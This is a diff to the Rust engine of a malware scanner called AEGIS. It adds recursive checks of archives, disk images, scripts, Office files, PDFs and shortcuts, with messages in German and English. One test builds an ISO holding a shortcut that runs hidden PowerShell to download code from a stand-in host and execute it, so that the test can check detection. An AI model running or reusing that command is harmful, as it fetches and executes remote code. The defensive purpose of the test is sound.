@@ -7,11 +7,48 @@ use std::path::{Path, PathBuf};
 use serde::Serialize;
 use sha2::{Digest, Sha256};
 
+use aegis_core::risk::RiskLevel;
+
+use crate::archive::{self, Budget, Member};
 use crate::clamav::ClamAv;
-use crate::finding::{self, Finding, Reason, Source, Weight};
+use crate::finding::{self, Category, Contained, Finding, MAX_CONTAINED, Reason, Source, Weight};
 use crate::hashlist::HashList;
 use crate::yara::YaraRules;
-use crate::{clamav, eicar, hash, heuristics, pe, yara};
+use crate::{clamav, eicar, hash, heuristics, lnk, office, pdf, pe, script, traits, yara};
+
+/// Ergebnis der Inhaltsprüfung (Datei oder Eintrag eines Containers).
+#[derive(Debug, Default)]
+struct Analysis {
+    reasons: Vec<Reason>,
+    not_scannable: Option<String>,
+    contained: Vec<Contained>,
+}
+
+/// Hängt einen Hinweis an „nicht (vollständig) prüfbar“ an.
+fn note(target: &mut Option<String>, text: impl Into<String>) {
+    let text = text.into();
+    match target {
+        Some(existing) if !existing.contains(&text) => {
+            existing.push_str(" · ");
+            existing.push_str(&text);
+        }
+        Some(_) => {}
+        None => *target = Some(text),
+    }
+}
+
+fn list(names: &[String]) -> String {
+    let shown: Vec<&str> = names.iter().take(5).map(String::as_str).collect();
+    if names.len() > shown.len() {
+        format!(
+            "{} und {} weitere",
+            shown.join(", "),
+            names.len() - shown.len()
+        )
+    } else {
+        shown.join(", ")
+    }
+}
 
 /// Grenzen gegen Überlastung (riesige Dateien, tiefe Ordner).
 #[derive(Debug, Clone, Copy)]
@@ -106,6 +143,7 @@ impl Engine {
     pub fn scan_file(&self, path: &Path) -> Finding {
         let mut reasons: Vec<Reason> = heuristics::reasons(path);
         let mut not_scannable = None;
+        let mut contained = Vec::new();
         let (sha256, size) = match read_and_hash(path, self.config.limits.max_analyze_bytes) {
             Ok(read) => {
                 if read.truncated {
@@ -114,7 +152,20 @@ impl Engine {
                         self.config.limits.max_analyze_bytes / (1024 * 1024)
                     ));
                 } else {
-                    reasons.extend(self.content_reasons(&read.head, &mut not_scannable));
+                    let name = path
+                        .file_name()
+                        .map(|n| n.to_string_lossy().into_owned())
+                        .unwrap_or_default();
+                    let mut budget = Budget {
+                        max_member: self.config.limits.max_analyze_bytes,
+                        ..Budget::default()
+                    };
+                    let analysis = self.analyze(&name, &read.head, 0, &mut budget);
+                    reasons.extend(analysis.reasons);
+                    if let Some(n) = analysis.not_scannable {
+                        note(&mut not_scannable, n);
+                    }
+                    contained = analysis.contained;
                 }
                 for list in &self.config.hash_lists {
                     if let Some(label) = list.lookup(&read.sha256) {
@@ -162,35 +213,232 @@ impl Engine {
             recommendation: finding::recommend(risk),
             reasons,
             not_scannable,
+            contained,
         }
     }
 
-    fn content_reasons(&self, bytes: &[u8], not_scannable: &mut Option<String>) -> Vec<Reason> {
-        let mut out = Vec::new();
+    /// Prüft Inhalt (einer Datei oder eines Archiv-Eintrags) mit allen Schichten; Container
+    /// werden – begrenzt durch `budget` – rekursiv geprüft.
+    fn analyze(&self, name: &str, bytes: &[u8], depth: u8, budget: &mut Budget) -> Analysis {
+        let mut a = Analysis::default();
+        if depth > 0 {
+            a.reasons.extend(heuristics::name_reasons(name));
+        }
         if eicar::is_eicar(bytes) {
-            out.push(Reason::new(
+            a.reasons.push(Reason::new(
                 "eicar",
                 Source::Eicar,
-                Weight::Definite(aegis_core::risk::RiskLevel::Dangerous),
+                Weight::Definite(RiskLevel::Dangerous),
                 "Enthält die EICAR-Prüfzeichenkette.",
                 "Contains the EICAR test string.",
             ));
         }
         if pe::looks_like_pe(bytes) {
             match pe::analyze(bytes) {
-                Ok(info) => out.extend(pe::reasons(&info)),
-                Err(e) => out.push(pe::malformed_reason(&e)),
+                Ok(info) => a.reasons.extend(pe::reasons(&info)),
+                Err(e) => a.reasons.push(pe::malformed_reason(&e)),
             }
         }
         if let Some(rules) = &self.config.yara {
             match rules.scan(bytes) {
-                Ok(hits) => out.extend(hits.iter().map(yara::reason)),
-                Err(e) => {
-                    not_scannable.get_or_insert_with(|| format!("YARA: {e}"));
+                Ok(hits) => {
+                    a.reasons.extend(hits.iter().map(yara::reason));
+                    a.reasons.extend(traits::combine(&hits));
                 }
+                Err(e) => note(&mut a.not_scannable, format!("YARA: {e}")),
             }
         }
-        out
+        let lower = name.to_ascii_lowercase();
+        if script::is_script_name(name) || lower.ends_with(".hta") {
+            a.reasons.extend(script::reasons(bytes));
+        }
+        if office::is_ole(bytes) {
+            a.reasons.extend(office::macro_reasons(bytes));
+        } else if office::is_rtf(bytes) {
+            a.reasons.extend(office::rtf_reasons(bytes));
+        } else if office::is_ooxml(bytes) {
+            a.reasons.extend(office::macro_reasons(bytes));
+            a.reasons.extend(office::ooxml_reasons(bytes));
+        }
+        if pdf::is_pdf(bytes) {
+            a.reasons.extend(pdf::reasons(bytes));
+        }
+        if lnk::is_lnk(bytes)
+            && let Some(info) = lnk::parse(bytes)
+        {
+            a.reasons.extend(lnk::reasons(&info));
+        }
+        if let Some(kind) = archive::detect(name, bytes) {
+            self.analyze_container(kind, name, bytes, depth, budget, &mut a);
+        }
+        a
+    }
+
+    fn analyze_container(
+        &self,
+        kind: archive::ContainerKind,
+        name: &str,
+        bytes: &[u8],
+        depth: u8,
+        budget: &mut Budget,
+        a: &mut Analysis,
+    ) {
+        if depth >= budget.max_depth {
+            note(
+                &mut a.not_scannable,
+                "Zu tief verschachtelt – innere Archive nicht geprüft",
+            );
+            return;
+        }
+        let mut encrypted = Vec::new();
+        let mut too_large = Vec::new();
+        let mut unreadable = Vec::new();
+        let mut children: Vec<(String, Analysis)> = Vec::new();
+        let mut program_inside = false;
+        let listing = archive::members(
+            kind,
+            name,
+            bytes,
+            budget,
+            &mut |member, budget| match member {
+                Member::Data { name: inner, bytes } => {
+                    program_inside |=
+                        heuristics::is_executable_name(&inner) || script::is_script_name(&inner);
+                    let child = self.analyze(&inner, &bytes, depth + 1, budget);
+                    children.push((inner, child));
+                }
+                Member::Encrypted { name } => encrypted.push(name),
+                Member::TooLarge { name } => too_large.push(name),
+                Member::Unreadable { name, error } => unreadable.push(format!("{name} ({error})")),
+            },
+        );
+        let label = kind.label();
+        let mut member_reasons = 0usize;
+        for (inner, child) in children {
+            let (risk, _, category) = finding::assess(&child.reasons);
+            if let Some(n) = &child.not_scannable {
+                note(&mut a.not_scannable, format!("{inner}: {n}"));
+            }
+            for mut nested in child.contained {
+                if a.contained.len() < MAX_CONTAINED {
+                    nested.name = format!("{inner}/{}", nested.name);
+                    a.contained.push(nested);
+                }
+            }
+            if risk == RiskLevel::Clean {
+                continue;
+            }
+            let (summary_de, summary_en) = finding::summarize(risk, category, &child.reasons);
+            let top = child
+                .reasons
+                .iter()
+                .filter(|r| matches!(r.weight, Weight::Definite(l) if l == risk))
+                .max_by_key(|r| {
+                    matches!(
+                        r.source,
+                        Source::Eicar | Source::HashList { .. } | Source::Yara { .. }
+                    )
+                });
+            if member_reasons < 20 {
+                if let Some(top) = top {
+                    member_reasons += 1;
+                    let source = if category == Category::TestFile {
+                        Source::Eicar
+                    } else {
+                        Source::Container
+                    };
+                    a.reasons.push(Reason::new(
+                        "container.member",
+                        source,
+                        Weight::Definite(risk),
+                        &format!("Enthält „{inner}“: {}", top.de),
+                        &format!("Contains \"{inner}\": {}", top.en),
+                    ));
+                } else if risk == RiskLevel::Suspicious {
+                    member_reasons += 1;
+                    a.reasons.push(Reason::new(
+                        "container.member_suspicious",
+                        Source::Container,
+                        Weight::Score(u8::try_from(finding::SUSPICIOUS_SCORE).unwrap_or(60)),
+                        &format!("Enthält die auffällige Datei „{inner}“."),
+                        &format!("Contains the suspicious file \"{inner}\"."),
+                    ));
+                }
+            }
+            if a.contained.len() < MAX_CONTAINED {
+                a.contained.push(Contained {
+                    name: inner,
+                    risk,
+                    category,
+                    summary_de,
+                    summary_en,
+                    reasons: child.reasons,
+                });
+            }
+        }
+        if !encrypted.is_empty() || listing.encrypted {
+            a.reasons.push(Reason::new(
+                "container.encrypted",
+                Source::Container,
+                Weight::Score(15),
+                "Passwortgeschützter Inhalt – Scanner können nicht hineinsehen; so wird Schadsoftware gern verschickt.",
+                "Password-protected content – scanners cannot look inside; malware is often sent this way.",
+            ));
+            let which = if encrypted.is_empty() {
+                format!("{label}-Archiv")
+            } else {
+                list(&encrypted)
+            };
+            note(
+                &mut a.not_scannable,
+                format!("Passwortgeschützt, nicht prüfbar: {which}"),
+            );
+        }
+        if !too_large.is_empty() {
+            a.reasons.push(Reason::new(
+                "container.bomb",
+                Source::Container,
+                Weight::Score(30),
+                "Ein Eintrag entpackt sich zu einer riesigen Datei (möglicherweise Zip-Bombe).",
+                "An entry unpacks to a huge file (possibly a zip bomb).",
+            ));
+            note(
+                &mut a.not_scannable,
+                format!("Zu groß zum Prüfen: {}", list(&too_large)),
+            );
+        }
+        if !unreadable.is_empty() {
+            note(
+                &mut a.not_scannable,
+                format!("Nicht lesbar: {}", list(&unreadable)),
+            );
+        }
+        if listing.truncated {
+            note(
+                &mut a.not_scannable,
+                "Nicht alle Inhalte geprüft (Grenzen gegen Zip-Bomben erreicht)",
+            );
+        }
+        if let Some(e) = listing.error {
+            note(&mut a.not_scannable, format!("{label} nicht lesbar: {e}"));
+        }
+        if listing.unsupported {
+            let text = if kind == archive::ContainerKind::Rar {
+                "RAR-Archive entpackt AEGIS nicht selbst; ClamAV prüft sie, wenn installiert"
+            } else {
+                "Datenträger-Abbild – Inhalt wird nicht entpackt"
+            };
+            note(&mut a.not_scannable, text);
+        }
+        if kind.is_image() && (program_inside || listing.unsupported) {
+            a.reasons.push(Reason::new(
+                "container.image_with_program",
+                Source::Container,
+                Weight::Score(25),
+                "Abbild-Datei mit Programm: Beim Öffnen übernimmt Windows den Download-Hinweis nicht – ein beliebter Trick, um Warnungen zu umgehen.",
+                "Image file containing a program: when opened, Windows does not carry over the download warning – a popular trick to bypass warnings.",
+            ));
+        }
     }
 
     /// Prüft Dateien und Ordner (rekursiv, ohne Links zu folgen).
@@ -302,4 +550,49 @@ fn read_and_hash(path: &Path, limit: u64) -> io::Result<ReadResult> {
         size,
         truncated: size > limit,
     })
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn iso_mit_verknuepfung_auf_powershell() {
+        let shortcut = crate::lnk::tests::build(
+            r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-w hidden -c iwr http://example.invalid/a | iex",
+            "",
+            7,
+        );
+        let image = crate::iso::tests::build(&[("rechnung.lnk", &shortcut)]);
+        let engine = Engine::with_builtin_rules().unwrap_or_else(|e| panic!("{e}"));
+        let mut budget = Budget::default();
+        let a = engine.analyze("rechnung.iso", &image, 0, &mut budget);
+        let codes: Vec<&str> = a.reasons.iter().map(|r| r.code.as_str()).collect();
+        assert!(codes.contains(&"container.image_with_program"), "{codes:?}");
+        assert!(codes.contains(&"container.member_suspicious"), "{codes:?}");
+        assert_eq!(a.contained[0].name, "RECHNUNG.LNK");
+        assert_eq!(a.contained[0].risk, RiskLevel::Suspicious);
+        let (risk, _, _) = finding::assess(&a.reasons);
+        assert_eq!(
+            risk,
+            RiskLevel::Suspicious,
+            "Heuristik bleibt unter „Gefährlich“"
+        );
+    }
+
+    #[test]
+    fn verschachtelung_ist_begrenzt() {
+        let mut inner = crate::archive::tests::zip_of(&[("x.txt", b"x")]);
+        for i in 0..5 {
+            inner = crate::archive::tests::zip_of(&[(&format!("ebene{i}.zip"), &inner)]);
+        }
+        let engine = Engine::new(EngineConfig::default());
+        let a = engine.analyze("tief.zip", &inner, 0, &mut Budget::default());
+        assert!(
+            a.not_scannable
+                .unwrap_or_default()
+                .contains("Zu tief verschachtelt")
+        );
+    }
 }
